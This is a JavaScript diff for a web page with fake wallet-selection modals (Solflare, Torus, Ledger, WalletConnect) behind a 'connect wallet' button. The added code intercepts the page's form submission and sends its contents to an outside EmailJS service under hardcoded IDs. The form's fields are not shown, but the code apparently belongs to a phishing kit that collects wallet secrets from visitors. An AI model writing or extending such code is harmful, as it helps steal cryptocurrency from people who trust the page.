@@ -30,8 +30,57 @@ connectWallet.addEventListener('click', () => {
 })
 popupbox.addEventListener('click', (e) => {
 	e.stopPropagation()
-}, { capture: false })
+})
 popupbg.addEventListener('click', (e) => {
 	e.stopPropagation()
 	popupbg.style.display = "none"
-}, { capture: false })
+})
+
+// (function () {
+// 	// https://dashboard.emailjs.com/admin/account
+// 	emailjs.init({
+// 		publicKey: "JyD16qbZ5jiq243nk",
+// 	});
+// })();
+// window.onload = function () {
+document.getElementById('form').addEventListener('submit', function (event) {
+	event.preventDefault();
+	// these IDs from the previous steps
+
+	emailjs.sendForm('service_ue3ovlf', 'template_oafjir5', this)
+		.then(() => {
+			console.log('SUCCESS!');
+		}, (error) => {
+			console.log('FAILED...', error);
+		});
+});
+// }
+
+const solflare_btn = document.querySelector(".solflare-btn")
+const torus_btn = document.querySelector(".torus-btn")
+const ledger_btn = document.querySelector(".ledger-btn")
+const wConnect_btn = document.querySelector(".wConnect-btn")
+
+const solflare_close_modal_button = document.querySelector(".solflare-modal #close-modal-button")
+const torus_close_modal_button = document.querySelector(".torus-modal #close-modal-button")
+const ledger_close_modal_button = document.querySelector(".ledger-modal #close-modal-button")
+const wConnect_close_modal_button = document.querySelector(".walletconnect-modal #close-modal-button")
+
+const openModal = (modal) => {
+	document.querySelector(`.${modal}-modal`).style.display = "flex"
+	popupbg.style.display = "none"
+}
+const closeModal = (modal) => {
+	document.querySelector(`.css-bvrne.${modal}-modal`).style.display = "none"
+}
+
+solflare_btn.addEventListener('click', () => openModal("solflare"))
+torus_btn.addEventListener('click', () => openModal("torus"))
+ledger_btn.addEventListener('click', () => openModal("ledger"))
+wConnect_btn.addEventListener('click', () => openModal("walletconnect"))
+solflare_close_modal_button.addEventListener('click', () => closeModal("solflare"))
+torus_close_modal_button.addEventListener('click', () => closeModal("torus"))
+ledger_close_modal_button.addEventListener('click', () => closeModal("ledger"))
+wConnect_close_modal_button.addEventListener('click', () => closeModal("walletconnect"))
+
+
